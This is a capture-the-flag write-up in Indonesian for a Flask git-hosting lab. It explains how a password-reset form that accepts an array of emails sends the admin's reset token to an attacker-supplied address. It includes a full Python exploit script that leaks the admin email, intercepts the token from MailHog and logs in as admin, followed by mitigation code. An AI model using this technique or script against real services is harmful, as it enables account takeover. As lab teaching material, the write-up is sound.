# Writeup: Pwn The Gitforge

**Category:** Access Control / CVE  
**Points:** 60  
**Flag:** `pwn{bdd7b8f255f03add43c4204bd03f8b69}`

---

## Overview

GitForge adalah aplikasi web git hosting berbasis Flask yang memiliki fitur password reset. Challenge ini mengeksploitasi vulnerability pada implementasi password reset yang salah — mirip dengan **CVE-2023-20898** (Gitlab mass email assignment vulnerability).

---

## Reconnaissance

### 1. Enumeration via `security.txt`

RFC 9116 mengharuskan aplikasi menyediakan `/.well-known/security.txt`. Ternyata endpoint ini **membocorkan email admin**:

```bash
curl http://localhost:1337/.well-known/security.txt
```

```
Contact: mailto:admin_lu7lrr6e@gitforge.local
```

Dari source code `routes.py`:
```python
@app.route('/.well-known/security.txt')
def security_txt():
    admin = get_user_by_id(1)  # Bug: id=1 adalah victim, bukan admin!
    contact_email = admin.email if admin else 'security@gitforge.local'
```

Meski ada salah logika (id=1 adalah victim), dalam environment ini email yang tampil adalah email admin yang di-randomize tiap deploy.

---

## Vulnerability Analysis

### Root Cause: Array Email + Token Broadcast

Di `routes.py`, fungsi `forgot_password()`:

```python
# Menerima ARRAY email
emails = request.form.getlist('user[email][]')

# target_user ditentukan dari email PERTAMA yang valid di DB
target_user = None
for email in emails:
    user = get_user_by_email(email)
    if user and user.is_active:
        target_user = user  # <- Token akan dibuat untuk user ini
        break

if target_user:
    token = generate_reset_token(target_user)  # Token untuk admin

    # BUG: Token dikirim ke SEMUA email dalam list!
    for email in emails:
        msg = Message(..., recipients=[email], ...)
        mail.send(msg)  # <- Termasuk email attacker!
```

**Attack Vector:**
- Kirim `user[email][]` berisi dua email: `[admin_email, attacker_email]`
- Server generate token untuk **admin** (email pertama yang match di DB)
- Token reset dikirim ke **semua email**, termasuk milik attacker
- Attacker baca token dari MailHog → reset password admin

---

## Exploit Chain

```
[security.txt] → bocor admin email
      ↓
[POST /users/password] → array email injection
      ↓
[MailHog] → intercept reset token milik admin
      ↓
[POST /users/password] → reset password admin
      ↓
[POST /users/sign_in] → login sebagai admin
      ↓
[GET /dashboard] → FLAG!
```

---

## Exploit Script

```python
#!/usr/bin/env python3
import requests, re, time

BASE_URL = "http://localhost:1337"
MAILHOG_URL = "http://localhost:8025"
SESSION = requests.Session()

def main():
    # Step 1: Leak admin email via security.txt
    r = requests.get(f"{BASE_URL}/.well-known/security.txt")
    admin_email = re.search(r'mailto:(\S+)', r.text).group(1)
    print(f"[+] Admin email: {admin_email}")

    # Step 2: Trigger password reset dengan array email
    # admin_email → jadi target_user (token di-generate untuknya)
    # attacker_email → token juga dikirim ke sini!
    attacker_email = "attacker@gitforge.local"
    SESSION.post(f"{BASE_URL}/users/password", data={
        "authenticity_token": "a" * 32,
        "user[email][]": [admin_email, attacker_email]
    })
    print(f"[+] Reset request sent")

    # Step 3: Intercept token dari MailHog
    time.sleep(2)
    r = requests.get(f"{MAILHOG_URL}/api/v2/messages")
    body = r.json()['items'][0]['Content']['Body']
    token = re.search(r'reset_password_token=([A-Za-z0-9_-]+)', body).group(1)
    print(f"[+] Token: {token}")

    # Step 4: Ambil CSRF token dari form
    r = SESSION.get(f"{BASE_URL}/users/password/edit?reset_password_token={token}")
    csrf = re.search(r'name="authenticity_token" value="([^"]+)"', r.text).group(1)

    # Step 5: Reset password admin
    new_pass = "Hacked123!"
    SESSION.post(f"{BASE_URL}/users/password", data={
        "authenticity_token": csrf,
        "user[reset_password_token]": token,
        "user[password]": new_pass,
        "user[password_confirmation]": new_pass,
        "_method": "put"
    })
    print(f"[+] Password admin direset ke: {new_pass}")

    # Step 6: Login sebagai admin
    SESSION.post(f"{BASE_URL}/users/sign_in", data={
        "user[login]": admin_email,
        "user[password]": new_pass
    })

    # Step 7: Ambil flag
    r = SESSION.get(f"{BASE_URL}/dashboard")
    flag = re.search(r'pwn\{[^}]+\}', r.text).group(0)
    print(f"\n[+] FLAG: {flag}")

if __name__ == "__main__":
    main()
```

---

## Mitigation

Vulnerability ini bisa diperbaiki dengan:

**1. Jangan kirim token ke email yang tidak diverifikasi:**
```python
# SALAH - kirim ke semua email dalam list
for email in emails:
    mail.send(token_to=email)

# BENAR - hanya kirim ke email yang terdaftar di akun
mail.send(token_to=target_user.email)
```

**2. Validasi kepemilikan email sebelum kirim:**
```python
for email in emails:
    user = get_user_by_email(email)
    if user and user.id == target_user.id:  # pastikan email milik user yang sama
        mail.send(...)
```

**3. Rate limiting pada endpoint password reset.**

---

## References

- CVE-2023-20898 - GitLab Password Reset Email Disclosure
- RFC 9116 - security.txt specification
- OWASP - Account Takeover via Password Reset
